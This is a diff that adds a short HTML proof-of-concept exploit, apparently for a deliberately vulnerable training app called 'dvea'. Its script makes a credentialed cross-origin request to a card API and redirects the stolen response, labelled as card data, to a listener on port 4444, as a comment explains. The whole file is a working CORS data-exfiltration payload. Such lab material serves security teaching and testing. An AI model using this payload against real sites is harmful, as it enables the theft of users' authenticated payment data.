@@ -1,0 +1,14 @@
+<!-- For the attack, just go to this folder, with a python listener on 4444 -->
+<html>
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','http://localhost/dvea/card_api.php',true);
+        req.withCredentials = true;
+        req.send();
+        
+        function reqListener() {
+            location='//127.0.0.1:4444/cors_redirect.html?card='+this.responseText;
+        };
+    </script>
+</html>
